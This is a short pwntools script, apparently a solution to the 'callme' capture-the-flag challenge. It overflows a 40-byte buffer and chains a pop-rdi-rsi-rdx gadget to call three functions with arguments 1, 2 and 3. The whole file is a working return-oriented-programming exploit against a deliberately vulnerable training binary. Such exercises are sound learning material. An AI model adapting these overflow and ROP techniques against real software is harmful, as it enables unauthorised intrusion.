#!/usr/bin/env python

from pwn import *

context.log_level = 'critical'
elf = ELF("./callme")

callme_one_addr = p64(0x00401850)
callme_two_addr = p64(0x00401870)
callme_three_addr = p64(0x00401810)
pop_three_addr = p64(0x0000000000401ab0) # pop rdi; pop rsi; pop rdx; ret;

payload = "A"*40 # Overflow the buffer
payload += pop_three_addr # Jump to the gadget. Each pop instruction will load the following 3 values
payload += p64(0x1) # Load 1 into rdi
payload += p64(0x2) # Load 2 into rsi
payload += p64(0x3) # Load 3 into rdx

payload += callme_one_addr # The 'ret; ' instruction returns into callme_one()

payload += pop_three_addr # We repeat the same thing to load the three values
payload += p64(0x1)
payload += p64(0x2)
payload += p64(0x3)

payload += callme_two_addr # And so on..

payload += pop_three_addr
payload += p64(0x1)
payload += p64(0x2)
payload += p64(0x3)

payload += callme_three_addr

sh = elf.process()
sh.recvuntil("> ")
sh.sendline(payload)

print sh.recvall()
